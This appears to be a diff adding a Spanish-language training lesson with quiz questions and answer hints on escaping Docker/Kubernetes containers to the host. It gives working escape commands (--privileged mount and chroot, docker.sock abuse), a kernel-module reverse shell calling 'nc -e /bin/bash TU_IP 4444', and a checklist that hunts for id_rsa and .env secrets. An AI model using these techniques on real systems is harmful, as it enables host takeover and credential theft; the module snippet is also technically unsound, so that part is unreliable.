@@ -1,0 +1,87 @@
+---
+index: 1
+title: "Container escape: del pod al host"
+questions:
+  - id: containers-y-cloud-t01-q01
+    prompt: "¿Qué flag de docker run da TODOS los privilegios del host al contenedor?"
+    hint: "--privileged"
+    kind: text
+  - id: containers-y-cloud-t01-q02
+    prompt: "¿Qué socket UNIX, si está montado en el contenedor, permite crear contenedores nuevos (escape directo)?"
+    hint: "/var/run/docker.sock"
+    kind: text
+  - id: containers-y-cloud-t01-q03
+    prompt: "¿Qué capability de Linux permite cargar módulos del kernel (equivalente a root en el host)?"
+    hint: "CAP_SYS_MODULE"
+    kind: choice
+    options:
+      - id: a
+        label: "CAP_NET_BIND_SERVICE"
+      - id: b
+        label: "CAP_SYS_MODULE — puede insmod un módulo kernel malicioso"
+      - id: c
+        label: "CAP_CHOWN"
+      - id: d
+        label: "CAP_FOWNER"
+---
+
+## Técnicas de escape por prioridad
+
+### 1. --privileged (la puerta abierta)
+
+```bash
+# Si el contenedor corre con --privileged:
+fdisk -l                          # ves TODOS los discos del host
+mount /dev/sda1 /mnt              # monta el filesystem del host
+chroot /mnt                       # eres root en el host
+```
+
+### 2. Docker socket montado
+
+Si `/var/run/docker.sock` está accesible dentro del contenedor, puedes controlar
+el Docker daemon del HOST:
+
+```bash
+# Dentro del contenedor:
+ls -la /var/run/docker.sock        # ¿existe?
+
+# Si existe: crea un contenedor nuevo con el FS del host montado
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
+```
+
+### 3. Capabilities excesivas
+
+```bash
+# Dentro del contenedor: ¿qué caps tengo?
+capsh --print
+
+# CAP_SYS_MODULE → cargar módulo kernel:
+cat > /tmp/reverse.c << 'EOF'
+#include <linux/kmod.h>
+static int __init init(void){ system("nc -e /bin/bash TU_IP 4444"); return 0; }
+module_init(init);
+EOF
+insmod /tmp/reverse.ko             # shell en el HOST
+```
+
+### 4. Namespace breakout (hostPID, hostNetwork)
+
+Si el contenedor comparte PID namespace con el host (`--pid=host`), puedes inyectar
+código en procesos del host via `/proc/<pid>/root`.
+
+### 5. Kernel exploits
+
+El contenedor comparte el kernel del host. DirtyPipe, DirtyCow, etc. funcionan
+desde dentro del contenedor contra el host.
+
+## Tu checklist de escape
+
+```bash
+# Dentro del contenedor comprometido:
+id                                   # ¿eres root dentro?
+cat /proc/self/status | grep Cap     # ¿qué capabilities?
+ls /var/run/docker.sock              # ¿docker socket?
+cat /proc/1/cgroup                   # ¿cgroup del host o del contenedor?
+ls /host /var/run/secrets/kubernetes.io  # ¿montajes del host?
+find / -name "*.env" -o -name "id_rsa" 2>/dev/null  # ¿secretos?
+```
